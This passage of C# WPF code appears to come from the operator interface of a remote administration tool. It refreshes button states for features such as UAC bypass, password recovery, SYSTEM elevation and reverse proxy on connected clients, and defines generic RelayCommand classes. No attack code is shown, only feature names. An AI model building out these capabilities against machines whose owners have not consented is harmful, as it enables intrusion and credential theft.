            OpenTcpConnectionsCommand?.RaiseCanExecuteChanged();
            OpenReverseProxyCommand?.RaiseCanExecuteChanged();
            OpenPasswordRecoveryCommand?.RaiseCanExecuteChanged();
            OpenSystemAudioCommand?.RaiseCanExecuteChanged();
            OpenRemoteChatCommand?.RaiseCanExecuteChanged();

            DeleteTempDirectoryCommand?.RaiseCanExecuteChanged();
            AskElevateCommand?.RaiseCanExecuteChanged();
            UacBypassCommand?.RaiseCanExecuteChanged();
            ElevateSystemCommand?.RaiseCanExecuteChanged();
            DeElevateCommand?.RaiseCanExecuteChanged();

            CopyClientIpCommand?.RaiseCanExecuteChanged();
            CopyClientEndpointCommand?.RaiseCanExecuteChanged();
            CopyClientIdCommand?.RaiseCanExecuteChanged();
            CopyClientUserAtPcCommand?.RaiseCanExecuteChanged();

            ClearSelectionCommand?.RaiseCanExecuteChanged();
        }

        public void Dispose()
        {
            if (_disposed)
            {
                return;
            }

            _disposed = true;
            UnwireServerEvents();
            ThemeService.Instance.ThemeChanged -= OnThemeChanged;

            foreach (var feedback in _allFeedbackStates)
            {
                feedback.Dispose();
            }
        }

        #endregion

        #region INotifyPropertyChanged Implementation

        public event PropertyChangedEventHandler PropertyChanged;

        protected void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }

        #endregion
    }

    /// <summary>
    /// Generic relay command implementation for MVVM with explicit RaiseCanExecuteChanged support.
    /// </summary>
    public class RelayCommand : ICommand
    {
        private readonly Action _execute;
        private readonly Func<bool> _canExecute;
        private event EventHandler _localCanExecuteChanged;

        public event EventHandler CanExecuteChanged
        {
            add
            {
                _localCanExecuteChanged += value;
                CommandManager.RequerySuggested += value;
            }
            remove
            {
                _localCanExecuteChanged -= value;
                CommandManager.RequerySuggested -= value;
            }
        }

        public RelayCommand(Action execute, Func<bool> canExecute = null)
        {
            _execute = execute ?? throw new ArgumentNullException(nameof(execute));
            _canExecute = canExecute;
        }

        public bool CanExecute(object parameter) => _canExecute?.Invoke() ?? true;

        public void Execute(object parameter) => _execute();

        public void RaiseCanExecuteChanged()
        {
            _localCanExecuteChanged?.Invoke(this, EventArgs.Empty);
            CommandManager.InvalidateRequerySuggested();
        }
    }

    /// <summary>
    /// Generic relay command with parameter.
    /// </summary>
    public class RelayCommand<T> : ICommand
    {
        private readonly Action<T> _execute;
        private readonly Func<T, bool> _canExecute;
        private event EventHandler _localCanExecuteChanged;

        public event EventHandler CanExecuteChanged
        {
            add
            {
                _localCanExecuteChanged += value;
                CommandManager.RequerySuggested += value;
            }
            remove
            {
                _localCanExecuteChanged -= value;
                CommandManager.RequerySuggested -= value;
            }
        }

        public RelayCommand(Action<T> execute, Func<T, bool> canExecute = null)
        {
            _execute = execute ?? throw new ArgumentNullException(nameof(execute));
            _canExecute = canExecute;
        }

        public bool CanExecute(object parameter)
        {
            if (parameter is T typedParam)
            {
                return _canExecute?.Invoke(typedParam) ?? true;
            }
            return false;
        }

        public void Execute(object parameter)
        {
            if (parameter is T typedParam)
            {
                _execute(typedParam);
            }
        }

        public void RaiseCanExecuteChanged()
        {
            _localCanExecuteChanged?.Invoke(this, EventArgs.Empty);
            CommandManager.InvalidateRequerySuggested();
        }
    }
}
